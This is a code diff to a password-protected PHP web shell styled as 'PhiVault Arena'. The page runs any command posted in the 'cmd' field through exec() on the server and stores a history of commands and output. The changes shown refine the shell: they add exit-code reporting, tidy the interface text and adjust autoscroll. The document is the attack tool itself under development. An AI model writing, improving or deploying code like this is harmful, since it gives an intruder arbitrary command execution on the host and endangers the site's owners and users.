@@ -6,7 +6,7 @@ if (!isset($_SESSION['loggedin'])) {
         if (hash("sha256", $_POST['pass']) === "68215fa3501ae17394bac692f12a5fe1cd6675a7c048d7307800956469f81057") {
             $_SESSION['loggedin'] = true;
         } else {
-            die("<pre>Incorrect password.</pre>");
+            die("<pre>Invalid password.</pre>");
         }
     } else {
         echo '<form method="post" style="background:black;color:lime;padding:20px">
@@ -21,9 +21,16 @@ if (!isset($_SESSION['loggedin'])) {
 $output = '';
 if (isset($_POST['cmd'])) {
     $cmd = $_POST['cmd'];
-    // safer and complete error capture
-    exec($cmd . " 2>&1", $lines);
+    $lines = [];
+    $return_code = 0;
+    exec($cmd . " 2>&1", $lines, $return_code);
     $output = implode("\n", $lines);
+
+    // Append error message if needed
+    if ($return_code !== 0) {
+        $output .= "\n[!] Command exited with code $return_code";
+    }
+
     $_SESSION['history'][] = ['cmd' => $cmd, 'output' => $output];
 }
 ?>
@@ -31,7 +38,7 @@ if (isset($_POST['cmd'])) {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WelCome To PhiVault Arena !</title>
+    <title>Welcome To PhiVault Arena !</title>
     <style>
         body {
             background-color: black;
@@ -44,7 +51,7 @@ if (isset($_POST['cmd'])) {
             border: 1px solid #444;
             padding: 15px;
             height: var(--panel-height, 400px);
-            overflow-y: scroll;
+            overflow-y: auto;
             margin-bottom: 15px;
             font-size: var(--output-size, 14px);
             color: var(--output-color, white);
@@ -70,6 +77,9 @@ if (isset($_POST['cmd'])) {
             color: cyan;
             margin-bottom: 10px;
             cursor: pointer;
+        }
+        pre {
+            margin: 5px 0;
         }
     </style>
 </head>
@@ -126,7 +136,7 @@ if (isset($_POST['cmd'])) {
         <input type="submit" value="Run">
     </form>
 
-    <!-- JS to handle style persistence -->
+    <!-- JS for UI customization and autoscroll -->
     <script>
         const root = document.documentElement;
 
@@ -169,9 +179,9 @@ if (isset($_POST['cmd'])) {
         // Apply saved settings on load
         applySavedSettings();
 
-        // Auto scroll to latest
-        const term = document.getElementById("terminal");
-        term.scrollTop = term.scrollHeight;
+        // Auto scroll to bottom on page load
+        const terminal = document.getElementById("terminal");
+        terminal.scrollTop = terminal.scrollHeight;
     </script>
 </body>
 </html>
